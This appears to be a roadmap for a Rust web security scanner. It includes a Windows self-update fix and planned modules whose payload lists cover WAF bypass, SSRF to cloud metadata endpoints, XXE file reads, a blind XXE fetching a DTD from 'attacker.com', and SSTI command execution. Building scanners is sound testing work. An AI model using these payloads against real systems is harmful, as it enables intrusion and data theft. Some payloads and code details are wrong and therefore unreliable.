## 🐛 Critical Fixes

### Windows Update Bug (Priority: CRITICAL)

**Problem:** `warden update --force` fails on Windows PowerShell with "Access denied (os error 5)"

**Root Cause:** The executable `warden.exe` is locked by PowerShell during execution, preventing `cargo install` from replacing it.

```
error: failed to move `C:\Users\Yanis\.cargo\bin\cargo-installmEMgqd\warden.exe`
to `C:\Users\Yanis\.cargo\bin\warden.exe`
Caused by: Accès refusé. (os error 5)
```

**Solution Options:**

#### Option 1: Self-Update Mechanism (Recommended)
```rust
// src/utils/update.rs
pub fn self_update() -> Result<()> {
    // 1. Download new version to temp location
    let temp_path = std::env::temp_dir().join("warden-new.exe");

    // 2. Create a batch script to replace after process exits
    let script_path = std::env::temp_dir().join("warden-update.bat");
    let script = format!(
        r#"
@echo off
timeout /t 2 /nobreak > nul
move /Y "{}" "{}" > nul 2>&1
del "{}"
echo Warden updated successfully!
"#,
        temp_path.display(),
        current_exe_path()?.display(),
        script_path.display()
    );

    std::fs::write(&script_path, script)?;

    // 3. Execute batch script detached and exit
    Command::new("cmd")
        .args(["/C", &script_path.to_string_lossy()])
        .spawn()?;

    std::process::exit(0);
}
```

#### Option 2: Move on Reboot (Fallback)
```rust
use windows_sys::Win32::System::Registry::MoveFileExW;

pub fn schedule_move_on_reboot() -> Result<()> {
    // Uses MoveFileExW with MOVEFILE_DELAY_UNTIL_REBOOT
    // Windows will replace the file on next boot
}
```

#### Option 3: Update Check Only (Current Workaround)
```bash
# Inform users to close terminal and run manually
warden update --check-only  # Only checks version, doesn't install
# Then: cargo install warden-sec --force
```

**Implementation Plan:**
1. [ ] Detect Windows platform
2. [ ] Download to temp directory instead of cargo bin
3. [ ] Create detached update script
4. [ ] Exit current process cleanly
5. [ ] Script replaces binary after warden closes

## 🚀 New Features

### 1. WAF Detection & Bypass
**File:** `src/scanners/waf.rs`

**Capabilities:**
- Detect WAF presence (Cloudflare, AWS WAF, Akamai, ModSecurity)
- Fingerprint WAF rules and behaviors
- Test bypass techniques (encoding, fragmentation, headers)
- Generate WAF-specific payloads

**Detection Methods:**
```rust
// Cross-reference testing
const WAF_PAYLOADS: &[&str] = &[
    "../../etc/passwd",           // Path traversal
    "1' OR '1'='1",               // SQL injection
    "<script>alert(1)</script>",  // XSS
    "SELECT * FROM users",        // SQL keyword
];

// Behavioral analysis
- Response time consistency (blocking vs processing)
- Status code patterns (403 vs 200)
- Response headers (Server, CF-RAY, X-Amzn-Request-ID)
- Challenge pages (CAPTCHA, JS challenges)
```

**Bypass Categories:**
- SQLi: `/*COMMENT*/`, `/**/`, `%0A`, case variation
- XSS: Unicode bypass, HTML entities, JavaScript obfuscation
- Path traversal: `..%c0%af..`, `....//`, double encoding
- Headers: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`

### 2. GraphQL Introspection & Injection
**File:** `src/scanners/graphql.rs`

**Capabilities:**
- Detect GraphQL endpoints (`/graphql`, `/graphiql`, `/playground`)
- Test introspection queries (schema discovery)
- Query injection testing
- Field duplication attacks
- Batch query attacks
- Denial of Service via nested queries

**Payloads:**
```graphql
# Introspection
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { name fields { name type { name } } }
  }
}

# Injection
query GetUser($id: ID!) {
  user(id: $id) { id email password { hash } }
}

# DoS (nested)
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends { ... }
        }
      }
    }
  }
}
```

### 3. SSRF (Server-Side Request Forgery)
**File:** `src/scanners/ssrf.rs`

**Capabilities:**
- Detect SSRF via HTTP headers
- Test internal network scanning
- Cloud metadata endpoints (AWS GCP Azure)
- File:// protocol testing
- DNS rebinding techniques

**Test Targets:**
```rust
const SSRF_PAYLOADS: &[&str] = &[
    // Internal networks
    "http://localhost/admin",
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/", // AWS
    "http://metadata.google.internal/",        // GCP
    "http://169.254.169.254/metadata/v1/",      // Azure

    // Protocol bypass
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/",
    "gopher://127.0.0.1:80/_GET%20/",

    // Filtering bypass
    "http://0177.0.0.1/",           // Octal
    "http://0x7f.0.0.1/",            // Hex
    "http://2130706433/",            // Decimal
    "http://[::]%",                  // IPv6
    "http://localhost.evil.com/",    // DNS rebinding
];
```

### 4. XXE (XML External Entity)
**File:** `src/scanners/xxe.rs`

**Capabilities:**
- Detect XML parsing endpoints
- Test XXE payloads (file read, SSRF, DoS)
- Blind XXE out-of-band detection
- Various XML parsers (libxml2, Java SAX, .NET XmlDocument)

**Payloads:**
```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/">]>
<foo>&xxe;</foo>

<!-- Blind XXE with parameter entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

### 5. SSTI (Server-Side Template Injection)
**File:** `src/scanners/ssti.rs`

**Capabilities:**
- Detect template engines (Jinja2, Twig, ERB, FreeMarker, Velocity)
- Test injection payloads
- Polyglot templates
- RCE via template injection

**Detection Payloads:**
```python
# Jinja2
{{7*7}}                                    # Math: 49
{{config}}                                 # Config object
{{''.__class__.__mro__[1].__sub__()}}      # RCE
{%for c in [].__class__.__base__.__subclasses__%}{{c}}{%endfor%}

# Twig
{{_self.env.display("id")}}
{{_self.env.cache.clear()}}

# ERB (Ruby)
<%= 7*7 %>
<%= system("id") %>

# FreeMarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity (Java)
#set($x='')##set($rt=$x.class.forName('java.lang.Runtime'))##set($chr=$x.class.forName('java.lang.Character'))##set($str=$x.class.forName('java.lang.String'))##set($ex=$rt.getRuntime().exec('id'))
```
